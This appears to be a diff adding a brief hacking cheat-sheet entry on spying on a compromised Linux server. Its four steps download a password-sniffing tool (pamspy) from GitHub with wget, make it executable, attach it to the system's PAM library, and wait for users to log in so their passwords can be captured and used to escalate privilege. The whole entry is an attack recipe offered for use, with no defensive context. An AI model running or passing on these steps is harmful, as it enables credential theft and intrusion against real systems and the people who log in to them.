@@ -1,0 +1,7 @@
+Name: How to spy in any compromised Linux server with low sudo privilege?
+Tags: spy, security, hacking
+
+1. wget https://github.com/citronneur/pamspy/releases/download/v0.2/pamspy
+2. chmod +x pamspy
+3. ./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4)
+4. Now just wait for someone to login to accounts and you will be able to sniff the passwords and gain more privilege & etc.
